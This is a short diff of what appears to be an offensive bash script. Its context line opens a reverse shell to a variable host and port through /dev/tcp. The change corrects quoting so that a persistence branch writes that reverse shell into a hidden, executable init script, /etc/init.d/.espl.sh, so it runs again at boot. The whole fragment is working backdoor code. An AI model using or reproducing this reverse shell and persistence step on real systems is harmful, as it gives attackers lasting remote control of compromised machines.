@@ -7,7 +7,7 @@ bash &> /dev/tcp/$HOST/$PORT 0>&1
 
 if [ $PERSISTENCE -eq 1 ]
 then
-    echo bash &> /dev/tcp/$HOST/$PORT 0>&1 > /etc/init.d/.espl.sh
+    echo "bash &> /dev/tcp/$HOST/$PORT 0>&1" > /etc/init.d/.espl.sh
 
     chmod +x /etc/init.d/.espl.sh
 
